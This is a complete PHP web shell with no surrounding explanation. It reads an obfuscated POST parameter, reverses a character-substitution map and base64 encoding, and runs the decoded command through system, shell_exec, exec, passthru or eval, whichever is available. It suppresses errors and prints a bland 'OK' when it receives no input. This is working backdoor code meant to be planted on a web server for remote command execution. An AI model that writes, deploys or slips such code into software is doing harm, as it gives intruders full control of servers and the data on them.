<?php
@error_reporting(0);
@ini_set('display_errors',0);

if(isset($_POST['data'])){
    $data = $_POST['data'];
    $map = array("|"=>"a","!"=>"b","@"=>"c","_"=>"d","~"=>"=");
    $decoded = strtr($data, $map);
    $cmd = base64_decode($decoded);
    
    if($cmd){
        echo "->|";
        if(function_exists('system')){
            system($cmd);
        }elseif(function_exists('shell_exec')){
            echo shell_exec($cmd);
        }elseif(function_exists('exec')){
            exec($cmd,$output);
            echo implode("\n",$output);
        }elseif(function_exists('passthru')){
            passthru($cmd);
        }else{
            eval($cmd);
        }
        echo "|<-";
    }
    exit;
}
echo "OK";
?>
